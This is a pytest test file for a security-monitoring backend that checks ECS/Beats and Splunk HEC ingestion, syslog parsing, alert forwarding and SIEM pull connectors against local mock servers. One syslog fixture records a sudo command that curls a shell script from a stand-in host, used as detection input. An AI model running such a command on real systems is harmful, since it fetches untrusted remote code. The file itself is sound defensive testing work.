"""Phase 3 integrations: ECS / Beats, Splunk HEC, syslog, alert forwarding, SIEM pull.

No real Splunk or Elasticsearch is available to the test suite, so the pull
connector and alert forwarding are exercised against local servers that speak
the same HTTP and UDP protocols.
"""

from __future__ import annotations

import asyncio
import csv
import importlib.util
import json
import socket
import threading
import time
from datetime import datetime, timezone
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path

import pytest
from fastapi.testclient import TestClient

from app.core.config import BACKEND_ROOT, PROJECT_ROOT, ForwardSettings, get_settings
from app.ingest.loader import make_context
from app.ingest.parsers import parse_records
from app.main import app, create_app
from app.models.inventory import Inventory
from app.services.forwarder import Forwarder, to_cef
from app.services.syslog_receiver import parse_syslog_line

DEMO = BACKEND_ROOT / "data" / "demo"
BOTS = BACKEND_ROOT / "data" / "botsv1" / "scenario"


# ---------------------------------------------------------------- helpers --

def _demo() -> tuple[list[dict], list[dict], list[dict]]:
    with (DEMO / "01_windows_security.csv").open(encoding="utf-8") as handle:
        security = list(csv.DictReader(handle))
    load = lambda name: [json.loads(l) for l in (DEMO / name).read_text(encoding="utf-8").splitlines() if l.strip()]
    return security, load("02_sysmon.jsonl"), load("03_zeek_dns.jsonl")


def _as_ecs() -> list[dict]:
    """The demo dataset as Winlogbeat (Security, Sysmon) and Filebeat-Zeek (DNS) would ship it."""
    security, sysmon, dns = _demo()
    docs: list[dict] = []
    for row in security:
        data = {k: v for k, v in row.items() if k not in {"RecordId", "TimeCreated", "EventID", "Computer"}}
        docs.append({
            "@timestamp": row["TimeCreated"],
            "event": {"code": row["EventID"], "provider": "Microsoft-Windows-Security-Auditing"},
            "winlog": {"channel": "Security", "event_id": int(row["EventID"]), "computer_name": row["Computer"],
                       "record_id": row["RecordId"], "event_data": data},
            "host": {"name": row["Computer"]},
        })
    for row in sysmon:
        data = {k: v for k, v in row.items() if k not in {"RecordId", "EventID", "Computer"}}
        docs.append({
            "@timestamp": row["UtcTime"],
            "winlog": {"channel": "Microsoft-Windows-Sysmon/Operational", "event_id": int(row["EventID"]),
                       "computer_name": row["Computer"], "record_id": row["RecordId"], "event_data": data},
            "host": {"name": row["Computer"]},
        })
    for row in dns:
        docs.append({
            "@timestamp": datetime.fromtimestamp(row["ts"], tz=timezone.utc).isoformat().replace("+00:00", "Z"),
            "event": {"dataset": "zeek.dns"},
            "dns": {"question": {"name": row["query"], "type": row.get("qtype_name")}},
            "source": {"ip": row["id.orig_h"]},
            "destination": {"ip": row["id.resp_h"]},
            "zeek": {"session_id": row["uid"]},
        })
    return docs


def _expected_story(client: TestClient) -> None:
    client.post("/api/live/flush")
    chains = client.get("/api/attacks").json()
    assert len(chains) == 1
    chain = chains[0]
    assert chain["event_count"] == 29
    assert (chain["initial_host"], chain["current_host"]) == ("HR-PC", "FINANCE-PC")
    assert chain["predictions"][0]["host"] == "DC01"


class _Capture(BaseHTTPRequestHandler):
    """Records every POST; answers with a canned body."""

    received: list[tuple[str, dict, bytes]] = []
    reply: bytes = b'{"text":"Success","code":0}'

    def do_POST(self) -> None:  # noqa: N802
        body = self.rfile.read(int(self.headers.get("Content-Length", 0)))
        type(self).received.append((self.path, dict(self.headers), body))
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(type(self).reply)

    def log_message(self, *args) -> None:  # silence
        pass


def _serve(handler: type[BaseHTTPRequestHandler]) -> tuple[HTTPServer, str]:
    server = HTTPServer(("127.0.0.1", 0), handler)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    return server, "http://127.0.0.1:{}".format(server.server_address[1])


@pytest.fixture()
def client():
    with TestClient(app) as test_client:
        test_client.post("/api/live/start", params={"clear": True})
        yield test_client
        test_client.post("/api/logs/reset")


# ------------------------------------------------------------- ECS / Beats --

def test_winlogbeat_and_filebeat_documents_rebuild_the_same_story(client):
    docs = _as_ecs()
    result = client.post("/api/live/events", params={"source": "winlogbeat"}, json=docs).json()
    assert result["rejected"] == 0, result["errors"]
    assert result["accepted"] == 56
    _expected_story(client)


def test_ecs_linux_authentication_is_understood():
    ctx = make_context(Inventory(), "test")
    events, errors = parse_records([{
        "@timestamp": "2026-10-07T10:00:00Z",
        "event": {"category": ["authentication"], "outcome": "failure"},
        "user": {"name": "root"}, "source": {"ip": "203.0.113.9"}, "host": {"name": "web01"},
    }], ctx)
    assert errors == []
    assert events[0].action.value == "LOGIN_FAILURE"
    assert events[0].destination_host == "WEB01" and events[0].source_ip == "203.0.113.9"


# --------------------------------------------------------------- Splunk HEC --

def test_splunk_hec_events_rebuild_the_same_story(client):
    security, sysmon, dns = _demo()
    body = "".join(
        json.dumps({"time": 0, "host": "hec", "sourcetype": sourcetype, "event": record})
        for sourcetype, rows in (("WinEventLog:Security", security), ("sysmon", sysmon), ("zeek:dns", dns))
        for record in rows
    )  # back to back, no separators: valid HEC
    response = client.post("/services/collector/event", content=body)
    assert response.status_code == 200
    assert response.json()["code"] == 0 and response.json()["prism"]["accepted"] == 56
    _expected_story(client)


def test_splunk_hec_protocol_details(client):
    assert client.get("/services/collector/health").json()["code"] == 17
    assert client.post("/services/collector/event", content="").json()["code"] == 5
    assert client.post("/services/collector/event", content="{bad").json()["code"] == 6
    assert client.post("/services/collector/event", json={"time": 1}).json()["code"] == 12
    text = client.post("/services/collector/event", json={"event": "plain text line"}).json()
    assert text["code"] == 0 and text["prism"]["skipped_text_events"] == 1


def test_splunk_hec_requires_the_code_when_auth_is_on(monkeypatch):
    monkeypatch.setenv("PRISM_AUTH_ENABLED", "true")
    monkeypatch.setenv("PRISM_AUTH_TOKEN", "hec-code")
    get_settings.cache_clear()
    try:
        with TestClient(create_app()) as secured:
            event = {"event": {"query": "x.org", "ts": 1790761620.0}}
            assert secured.post("/services/collector/event", json=event).json()["code"] == 2
            bad = secured.post("/services/collector/event", json=event, headers={"Authorization": "Splunk nope"})
            assert bad.status_code == 403 and bad.json()["code"] == 4
            ok = secured.post("/services/collector/event", json=event, headers={"Authorization": "Splunk hec-code"})
            assert ok.status_code == 200 and ok.json()["code"] == 0
    finally:
        get_settings.cache_clear()


# ------------------------------------------------------------------ syslog --

def test_syslog_lines_are_parsed():
    failed = parse_syslog_line("<38>Oct  7 10:01:02 web01 sshd[811]: Failed password for invalid user admin from 203.0.113.9 port 51522 ssh2")
    assert failed["event"]["outcome"] == "failure" and failed["user"]["name"] == "admin"
    assert failed["source"]["ip"] == "203.0.113.9" and failed["host"]["name"] == "WEB01"
    accepted = parse_syslog_line("<38>1 2026-10-07T10:02:00Z db01.corp sshd 912 - - Accepted publickey for deploy from 10.0.0.7 port 40022 ssh2")
    assert accepted["event"]["outcome"] == "success" and accepted["host"]["name"] == "DB01"
    sudo = parse_syslog_line("<85>Oct  7 10:03:00 web01 sudo:   alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/curl http://x.top/a.sh")
    assert sudo["EventID"] == "1" and sudo["User"] == "alice" and sudo["Image"] == "/usr/bin/curl"
    assert parse_syslog_line("<30>Oct  7 10:04:00 web01 cron[1]: (root) CMD (run-parts)") is None
    assert parse_syslog_line("not syslog at all") is None


def _free_tcp_and_udp_port() -> int:
    """A port free for BOTH protocols (the receiver listens on both)."""
    for _ in range(50):
        with socket.socket() as tcp:
            tcp.bind(("127.0.0.1", 0))
            port = tcp.getsockname()[1]
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as udp:
                    udp.bind(("127.0.0.1", port))
            except OSError:
                continue
            return port
    raise RuntimeError("no port free for both TCP and UDP")


def test_syslog_receiver_ingests_live_udp_and_tcp(monkeypatch):
    port = _free_tcp_and_udp_port()
    monkeypatch.setenv("PRISM_SYSLOG_ENABLED", "true")
    monkeypatch.setenv("PRISM_SYSLOG_PORT", str(port))
    get_settings.cache_clear()
    try:
        with TestClient(create_app()) as live:
            live.post("/api/live/start", params={"clear": True})
            stamp = datetime.now().strftime("%b %d %H:%M:%S").replace(" 0", "  ", 1) if datetime.now().day < 10 else datetime.now().strftime("%b %d %H:%M:%S")
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as udp:
                for _ in range(3):
                    udp.sendto("<38>{} web01 sshd[1]: Failed password for root from 203.0.113.9 port 1 ssh2".format(stamp).encode(), ("127.0.0.1", port))
            with socket.create_connection(("127.0.0.1", port)) as tcp:
                tcp.sendall("<38>{} web01 sshd[2]: Accepted password for root from 203.0.113.9 port 2 ssh2\n".format(stamp).encode())
            time.sleep(2.0)  # the receiver batches once a second
            live.post("/api/live/flush")
            events = live.get("/api/events", params={"limit": 50}).json()
            assert sorted(e["action"] for e in events) == ["LOGIN_FAILURE"] * 3 + ["LOGIN_SUCCESS"]
            status = live.get("/api/live/integrations").json()["syslog_receiver"]
            assert status["listening"] and status["messages_understood"] == 4
    finally:
        get_settings.cache_clear()


# --------------------------------------------------------- alert forwarding --

def test_attack_chains_are_forwarded_to_webhook_hec_and_syslog(client):
    _Capture.received = []
    server, url = _serve(_Capture)
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as udp:
        udp.bind(("127.0.0.1", 0))
        udp.settimeout(5)
        forwarder = Forwarder(
            ForwardSettings(webhook_url=url + "/hook", splunk_hec_url=url + "/services/collector/event",
                            splunk_hec_token="siem-token", syslog_target="127.0.0.1:{}".format(udp.getsockname()[1])),
            version="test",
        )
        client.post("/api/logs/reset")
        chains = app.state.soc.analysis.chains
        assert len(forwarder.notify(chains)) == 1
        cef = udp.recvfrom(65535)[0].decode()
    deadline = time.time() + 5
    while len(_Capture.received) < 2 and time.time() < deadline:
        time.sleep(0.05)
    server.shutdown()

    paths = {path: (headers, json.loads(body)) for path, headers, body in _Capture.received}
    hook = paths["/hook"][1]
    assert hook["chain_id"] == "ATTACK-001" and hook["current_host"] == "FINANCE-PC"
    assert hook["predicted_next_target"]["host"] == "DC01" and hook["predicted_next_target"]["assurance"] == "predicted"
    hec_headers, hec = paths["/services/collector/event"]
    assert hec_headers["Authorization"] == "Splunk siem-token" and hec["sourcetype"] == "prism:attack_chain"
    assert "CEF:0|PRISM|PRISM|test|attack_chain|ATTACK-001" in cef and "dhost=FINANCE-PC" in cef
    assert forwarder.notify(chains) == []  # unchanged chain: not sent twice
    assert forwarder.status()["alerts_sent"] == 3


def test_cef_escaping():
    line = to_cef({"chain_id": "A|1", "name": "x=y", "severity": "critical", "version": "1",
                   "initial_host": "a=b", "users": [], "mitre_techniques": []})
    assert line.startswith("CEF:0|PRISM|PRISM|1|attack_chain|A\\|1: x=y|10|")
    assert "shost=a\\=b" in line


# ------------------------------------------------------------ SIEM pull --

def _load_pull():
    spec = importlib.util.spec_from_file_location("siem_pull", PROJECT_ROOT / "scripts" / "siem_pull.py")
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def test_splunk_pull_reads_export_results_prism_understands():
    rows = [json.loads(l) for l in (BOTS / "03_dns.jsonl").read_text(encoding="utf-8").splitlines()[:40]]
    for row in rows:
        row.pop("dataset", None)  # as Splunk returns them
    export = "\n".join(json.dumps({"preview": False, "result": r}) for r in rows)

    class Splunk(_Capture):
        received = []
        reply = export.encode()

    server, url = _serve(Splunk)
    pull = _load_pull()
    args = type("A", (), {"query": "index=botsv1 sourcetype=stream:dns", "url": url, "token": "tok",
                          "user": None, "password": None, "insecure": False})()
    records, newest = pull.pull_splunk(args, datetime(2016, 8, 24, tzinfo=timezone.utc))
    server.shutdown()
    path, headers, body = Splunk.received[0]
    assert path == "/services/search/jobs/export" and headers["Authorization"] == "Bearer tok"
    assert b"search+index%3Dbotsv1" in body and b"output_mode=json" in body
    assert len(records) == 40 and newest > datetime(2016, 8, 24, tzinfo=timezone.utc)
    events, errors = parse_records(records, make_context(Inventory(), "siem"))
    assert errors == [] and len(events) == 40


def test_elastic_pull_reads_ecs_documents():
    docs = _as_ecs()[:20]
    reply = json.dumps({"hits": {"hits": [{"_id": "id{}".format(i), "_source": d} for i, d in enumerate(docs)]}})

    class Elastic(_Capture):
        received = []

    Elastic.reply = reply.encode()
    server, url = _serve(Elastic)
    pull = _load_pull()
    args = type("A", (), {"url": url, "index": "winlogbeat-*", "api_key": "k", "user": None, "password": None,
                          "batch": 500, "insecure": False})()
    records, newest = pull.pull_elastic(args, datetime(2026, 1, 1, tzinfo=timezone.utc))
    server.shutdown()
    path, headers, body = Elastic.received[0]
    assert path == "/winlogbeat-*/_search" and headers["Authorization"] == "ApiKey k"
    assert json.loads(body)["sort"][0]["@timestamp"]["order"] == "asc"
    events, errors = parse_records(records, make_context(Inventory(), "siem"))
    assert errors == [] and len(events) == 20


def test_splunk_results_holding_json_are_forwarded_as_the_original_event():
    pull = _load_pull()
    original = {"EventID": "1", "UtcTime": "2026-09-30T10:02:12Z", "Computer": "HR-PC", "Image": "powershell.exe"}
    as_json = pull.splunk_record({"_raw": json.dumps(original), "sourcetype": "_json", "_time": "2026-09-30T10:02:12.000+00:00"})
    assert as_json == original  # read by PRISM exactly as if it came from Sysmon
    extracted = {"EventCode": "4624", "sourcetype": "WinEventLog:Security", "_raw": "LogName=Security EventCode=4624"}
    assert pull.splunk_record(extracted) == {"result": extracted}  # add-on extractions keep the Splunk shape
